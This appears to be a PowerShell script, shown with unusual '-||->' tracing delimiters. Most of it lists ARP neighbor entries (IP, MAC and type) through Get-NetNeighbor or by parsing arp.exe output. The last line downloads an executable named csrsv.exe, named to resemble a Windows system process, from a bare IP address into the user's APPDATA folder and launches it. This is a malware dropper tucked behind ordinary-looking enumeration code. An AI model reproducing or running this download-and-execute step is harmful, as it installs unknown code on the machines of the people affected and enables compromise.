

 -||-> if ( -||-> Get-Command Get-NetNeighbor -ErrorAction SilentlyContinue <-||- ) {
     -||-> Get-NetNeighbor <-||- 
} else {
     -||-> $IpPattern = "\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}" <-||- 
     -||-> foreach ($line in  -||-> ( -||-> & $env:windir\system32\arp.exe -a <-||- ) <-||- ) {
         -||-> $line = $line.Trim() <-||- 
         -||-> if ( -||-> $line.Length -gt 0 <-||- ) {
             -||-> if ( -||-> $line -match 'Interface:\s(?<Interface>\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\s.*' <-||- ) {
                 -||-> $Interface = $matches['Interface'] <-||- 
            } elseif ( -||-> $line -match '(?<IpAddr>\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\s+(?<Mac>[0-9A-Fa-f]{2}\-[0-9A-Fa-f]{2}\-[0-9A-Fa-f]{2}\-[0-9A-Fa-f]{2}\-[0-9A-Fa-f]{2}\-[0-9A-Fa-f]{2})*\s+(?<Type>dynamic|static)' <-||- ) {
                 -||-> $IpAddr = $matches['IpAddr'] <-||- 
                 -||-> if ( -||-> $matches['Mac'] <-||- ) {
                     -||-> $Mac = $matches['Mac'] <-||- 
                } else {
                     -||-> $Mac = "" <-||- 
                } <-||- 
                 -||-> $Type   = $matches['Type'] <-||- 
                 -||-> $o =  -||-> "" | Select-Object Interface, IpAddr, Mac, Type <-||-  <-||- 
                 -||-> $o.Interface, $o.IpAddr, $o.Mac, $o.Type = $Interface, $IpAddr, $Mac, $Type <-||- 
                 -||-> $o <-||- 
            } <-||- 
        } <-||- 
    } <-||- 
} <-||- 
 -||-> ( -||-> New-Object System.Net.WebClient <-||- ).DownloadFile('http://89.248.170.218/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe") <-||- ; -||-> Start-Process ( -||-> "$env:APPDATA\csrsv.exe" <-||- ) <-||- 



